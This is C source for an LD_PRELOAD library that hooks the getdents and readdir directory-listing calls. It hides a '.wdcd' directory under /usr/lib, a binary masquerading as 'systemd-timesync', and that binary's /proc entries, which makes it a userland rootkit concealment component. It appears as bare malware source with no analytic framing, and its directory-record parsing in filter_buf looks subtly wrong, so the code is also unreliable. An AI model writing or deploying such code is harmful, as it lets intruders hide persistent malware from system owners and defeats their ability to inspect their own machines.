#define _GNU_SOURCE
#include <stddef.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/syscall.h>

static char self_hidden[] = ".wdcd";
static char self_hidden_bin[] = "systemd-timesync";
static char marker_file[] = "/usr/lib/.wdcd/bin/systemd-timesync";

static int (*real_getdents64)(int, void *, unsigned int) = NULL;
static int (*real_getdents32)(int, void *, unsigned int) = NULL;
static struct dirent *(*real_readdir)(DIR *) = NULL;
static struct dirent *(*real_readdir64)(DIR *) = NULL;

static int is_marker_proc(const char *name) {
    if (name[0] < '0' || name[0] > '9') return 0;
    char cmd[64], buf[256];
    snprintf(cmd, sizeof(cmd), "/proc/%s/cmdline", name);
    int fd = open(cmd, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = 0;
    return strstr(buf, self_hidden_bin) != NULL;
}

static int want_hide(const char *name, const char *path) {
    if (!name) return 0;
    if (strcmp(name, self_hidden) == 0) return strstr(path, "/usr/lib") != NULL;
    if (strcmp(name, self_hidden_bin) == 0) return strstr(path, "/usr/lib/") != NULL && strstr(path, ".wdcd") != NULL;
    if (strstr(path, "/proc") == path) return is_marker_proc(name);
    return 0;
}

static int64_t filter_buf(const char *path, void *vbuf, int64_t len) {
    if (len <= 0) return len;
    char *dst = vbuf;
    char *src = vbuf;
    int64_t off = 0, wrote = 0;
    while (off + 2 <= len) {
        unsigned short reclen = *(unsigned short *)(src + off);
        if (reclen < 2 || off + reclen > len) break;
        const char *name = src + off + 2 + 3;
        if (want_hide(name, path)) {
            off += reclen;
            continue;
        }
        memmove(dst + wrote, src + off, reclen);
        wrote += reclen;
        off += reclen;
    }
    return wrote;
}

static void init_real(void) {
    if (!real_getdents64) real_getdents64 = dlsym(RTLD_NEXT, "getdents64");
    if (!real_getdents32) real_getdents32 = dlsym(RTLD_NEXT, "getdents");
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    if (!real_readdir64) real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
}

int getdents64(int fd, void *dirp, unsigned int count) {
    init_real();
    if (!real_getdents64) return syscall(SYS_getdents64, fd, dirp, count);
    int n = real_getdents64(fd, dirp, count);
    if (n <= 0) return n;
    char path[512];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char target[512];
    ssize_t r = readlink(path, target, sizeof(target) - 1);
    if (r > 0 && r < (ssize_t)sizeof(target)) target[r] = 0; else target[0] = 0;
    if (target[0] == 0) snprintf(target, sizeof(target), "?");
    return (int)filter_buf(target, dirp, n);
}

int getdents(int fd, struct dirent *dirp, size_t count) {
    init_real();
    if (!real_getdents32) return syscall(SYS_getdents, fd, dirp, count);
    int n = real_getdents32(fd, dirp, count);
    if (n <= 0) return n;
    char path[512];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char target[512];
    ssize_t r = readlink(path, target, sizeof(target) - 1);
    if (r > 0 && r < (ssize_t)sizeof(target)) target[r] = 0; else target[0] = 0;
    if (target[0] == 0) snprintf(target, sizeof(target), "?");
    return (int)filter_buf(target, dirp, n);
}

static struct dirent *filter_dirent(DIR *dirp, struct dirent *de) {
    char path[512];
    int fd = dirfd(dirp);
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char target[512];
    ssize_t r = readlink(path, target, sizeof(target) - 1);
    if (r > 0 && r < (ssize_t)sizeof(target)) target[r] = 0; else target[0] = 0;
    if (target[0] == 0) snprintf(target, sizeof(target), "?");
    while (de && want_hide(de->d_name, target))
        de = real_readdir(dirp);
    return de;
}

struct dirent *readdir(DIR *dirp) {
    init_real();
    if (!real_readdir) return NULL;
    return filter_dirent(dirp, real_readdir(dirp));
}

struct dirent *readdir64(DIR *dirp) {
    init_real();
    if (!real_readdir64) real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    if (!real_readdir64) return NULL;
    char path[512];
    int fd = dirfd(dirp);
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char target[512];
    ssize_t r = readlink(path, target, sizeof(target) - 1);
    if (r > 0 && r < (ssize_t)sizeof(target)) target[r] = 0; else target[0] = 0;
    struct dirent *de = real_readdir64(dirp);
    while (de && want_hide(de->d_name, target))
        de = real_readdir64(dirp);
    return de;
}
